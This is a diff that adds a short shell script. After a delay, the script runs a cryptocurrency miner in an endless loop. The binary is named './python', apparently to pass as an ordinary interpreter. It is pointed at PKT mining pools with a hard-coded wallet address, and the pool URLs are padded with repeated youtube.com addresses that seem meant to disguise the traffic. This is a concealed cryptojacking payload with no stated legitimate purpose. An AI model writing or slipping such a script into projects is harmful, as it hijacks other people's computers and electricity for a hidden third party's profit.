@@ -1,0 +1,7 @@
+sleep 20
+
+while true; do
+./python ann -t 1 -p pkt1qk72fmt0t7jlnmzece7fr378mmhwf2luuuqh5lv http://pool.pkt.world http://youtube.com http://pool.pkt.world http://youtube.com http://pool.pkt.world http://youtube.com http://pool.pkt.world http://youtube.com http://pool.pkt.world http://youtube.com http://pool.pkt.world http://youtube.com http://pool.pktpool.io http://pool.srizbi.com
+sleep 60
+done
+
